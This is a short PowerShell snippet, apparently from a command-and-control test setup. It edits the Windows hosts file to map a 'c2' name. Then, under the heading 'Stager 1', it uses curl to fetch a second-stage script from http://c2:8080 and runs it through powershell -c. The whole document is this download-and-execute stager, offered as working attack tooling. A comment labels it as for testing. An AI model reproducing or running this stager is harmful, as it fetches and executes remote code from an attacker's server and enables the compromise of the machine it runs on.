
# For testing purposes, add C2 server to /etc/hosts on test machine
Add-Content /Windows/System32/drivers/etc/hosts "0.0.0.0 c2"

# Stager 1
powershell -c "$(curl "http://c2:8080/scripts/remote/stagers/stage2.ps1")"